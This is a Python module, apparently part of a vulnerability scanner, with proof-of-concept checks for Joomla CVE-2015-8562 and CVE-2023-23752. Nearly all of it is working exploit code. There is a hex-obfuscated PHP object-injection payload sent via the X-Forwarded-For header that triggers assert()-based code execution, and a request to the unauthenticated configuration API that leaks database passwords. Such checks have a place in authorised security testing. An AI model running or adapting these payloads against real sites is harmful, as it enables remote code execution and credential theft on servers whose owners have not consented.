import requests
import binascii
from payload import headers

class Joomla:

    def __init__(self):

        self.software = ["Joomla"]
        self.vul_list = ["CVE-2015-8562","CVE-2021-23132","CVE-2023-23752"]


    def poc_cve_2015_8562(self,url):

        payload = '\x31\x32\x33\x7d\x5f\x5f\x74\x65\x73\x74\x7c\x4f\x3a\x32\x31\x3a\x22\x4a\x44\x61\x74\x61\x62\x61\x73\x65\x44\x72\x69\x76\x65\x72\x4d\x79\x73\x71\x6c\x69\x22\x3a\x33\x3a\x7b\x73\x3a\x34\x3a\x22\x5c\x30\x5c\x30\x5c\x30\x61\x22\x3b\x4f\x3a\x31\x37\x3a\x22\x4a\x53\x69\x6d\x70\x6c\x65\x70\x69\x65\x46\x61\x63\x74\x6f\x72\x79\x22\x3a\x30\x3a\x7b\x7d\x73\x3a\x32\x31\x3a\x22\x5c\x30\x5c\x30\x5c\x30\x64\x69\x73\x63\x6f\x6e\x6e\x65\x63\x74\x48\x61\x6e\x64\x6c\x65\x72\x73\x22\x3b\x61\x3a\x31\x3a\x7b\x69\x3a\x30\x3b\x61\x3a\x32\x3a\x7b\x69\x3a\x30\x3b\x4f\x3a\x39\x3a\x22\x53\x69\x6d\x70\x6c\x65\x50\x69\x65\x22\x3a\x35\x3a\x7b\x73\x3a\x38\x3a\x22\x73\x61\x6e\x69\x74\x69\x7a\x65\x22\x3b\x4f\x3a\x32\x30\x3a\x22\x4a\x44\x61\x74\x61\x62\x61\x73\x65\x44\x72\x69\x76\x65\x72\x4d\x79\x73\x71\x6c\x22\x3a\x30\x3a\x7b\x7d\x73\x3a\x35\x3a\x22\x63\x61\x63\x68\x65\x22\x3b\x62\x3a\x31\x3b\x73\x3a\x31\x39\x3a\x22\x63\x61\x63\x68\x65\x5f\x6e\x61\x6d\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x22\x3b\x73\x3a\x36\x3a\x22\x61\x73\x73\x65\x72\x74\x22\x3b\x73\x3a\x31\x30\x3a\x22\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x22\x3b\x69\x3a\x39\x39\x39\x39\x3b\x73\x3a\x38\x3a\x22\x66\x65\x65\x64\x5f\x75\x72\x6c\x22\x3b\x73\x3a\x33\x37\x3a\x22\x70\x68\x70\x69\x6e\x66\x6f\x28\x29\x3b\x4a\x46\x61\x63\x74\x6f\x72\x79\x3a\x3a\x67\x65\x74\x43\x6f\x6e\x66\x69\x67\x28\x29\x3b\x65\x78\x69\x74\x3b\x22\x3b\x7d\x69\x3a\x31\x3b\x73\x3a\x34\x3a\x22\x69\x6e\x69\x74\x22\x3b\x7d\x7d\x73\x3a\x31\x33\x3a\x22\x5c\x30\x5c\x30\x5c\x30\x63\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x22\x3b\x69\x3a\x31\x3b\x7d\xf0\x9d\x8c\x86'

        headers1 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",

            'x-forwarded-for': payload  # X-Forwarded-For header instead of UA
        }

        req1 = requests.get(url=url,headers =headers1,verify=False,timeout=3)

        if req1.status_code == 200:
            dict = req1.headers
            cookie = dict.get("Set-Cookie").split(" ")[0]

        cookie = {"Cookie": cookie}
        headers1.update(cookie)
        req2 = requests.get(url=url,headers=headers1,cookies=cookie,verify=False,timeout=3)

        if req2.status_code == 200 and "PHP Version" in req2.text:

            return "CVE-2015-8562"

        return False



    def poc_cve_2023_23752(self,url):

        payload = "/api/index.php/v1/config/application?public=true"
        url = url + payload

        req = requests.get(url=url,headers=headers,verify=False,timeout=3)

        if req.status_code == 200 and "password" in req.text:
            return "CVE-2023-23752"

        return False